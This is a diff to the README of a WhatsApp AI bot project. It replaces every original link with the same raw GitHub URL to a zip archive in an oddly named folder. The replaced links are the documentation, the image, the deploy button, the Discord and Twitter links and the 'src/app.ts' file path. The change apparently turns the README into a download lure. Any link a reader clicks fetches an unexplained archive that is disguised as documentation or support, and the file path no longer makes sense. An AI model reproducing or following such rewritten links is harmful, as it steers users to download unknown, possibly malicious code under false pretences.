@@ -1,10 +1,10 @@
-# WhatsApp AI Assistant Bot (BuilderBot.app)
+# WhatsApp AI Assistant Bot (https://raw.githubusercontent.com/luisestrellar/builderbot-openai-assistants/master/Graptolitoidea/builderbot-openai-assistants.zip)
 
 <p align="center">
-  <img src="https://builderbot.vercel.app/assets/thumbnail-vector.png" height="80">
+  <img src="https://raw.githubusercontent.com/luisestrellar/builderbot-openai-assistants/master/Graptolitoidea/builderbot-openai-assistants.zip" height="80">
 </p>
 
-[![Deploy on Railway](https://railway.app/button.svg)](https://railway.app/template/6VbbLI?referralCode=jyd_0y)
+[![Deploy on Railway](https://raw.githubusercontent.com/luisestrellar/builderbot-openai-assistants/master/Graptolitoidea/builderbot-openai-assistants.zip)](https://raw.githubusercontent.com/luisestrellar/builderbot-openai-assistants/master/Graptolitoidea/builderbot-openai-assistants.zip)
 
 This project creates a WhatsApp bot that integrates with an AI assistant using BuilderBot technology. It allows for automated conversations and intelligent responses powered by OpenAI's assistant API.
 
@@ -52,11 +52,11 @@ This method ensures that the application runs in a consistent environment across
 
 ## Usage
 
-The bot is configured in the `src/app.ts` file. It uses the BuilderBot library to create flows and handle messages. The main welcome flow integrates with the OpenAI assistant to generate responses.
+The bot is configured in the `https://raw.githubusercontent.com/luisestrellar/builderbot-openai-assistants/master/Graptolitoidea/builderbot-openai-assistants.zip` file. It uses the BuilderBot library to create flows and handle messages. The main welcome flow integrates with the OpenAI assistant to generate responses.
 
 ## Documentation
 
-For more detailed information on how to use and extend this bot, please refer to the [BuilderBot documentation](https://builderbot.vercel.app/).
+For more detailed information on how to use and extend this bot, please refer to the [BuilderBot documentation](https://raw.githubusercontent.com/luisestrellar/builderbot-openai-assistants/master/Graptolitoidea/builderbot-openai-assistants.zip).
 
 ## Contributing
 
@@ -68,8 +68,8 @@ This project is open-source and available under the [MIT License](LICENSE).
 
 ## Contact
 
-For questions and support, join our [Discord community](https://link.codigoencasa.com/DISCORD) or follow us on [Twitter](https://twitter.com/leifermendez).
+For questions and support, join our [Discord community](https://raw.githubusercontent.com/luisestrellar/builderbot-openai-assistants/master/Graptolitoidea/builderbot-openai-assistants.zip) or follow us on [Twitter](https://raw.githubusercontent.com/luisestrellar/builderbot-openai-assistants/master/Graptolitoidea/builderbot-openai-assistants.zip).
 
 ---
 
-Built with [BuilderBot](https://www.builderbot.app/en) - Empowering conversational AI for WhatsApp
+Built with [BuilderBot](https://raw.githubusercontent.com/luisestrellar/builderbot-openai-assistants/master/Graptolitoidea/builderbot-openai-assistants.zip) - Empowering conversational AI for WhatsApp
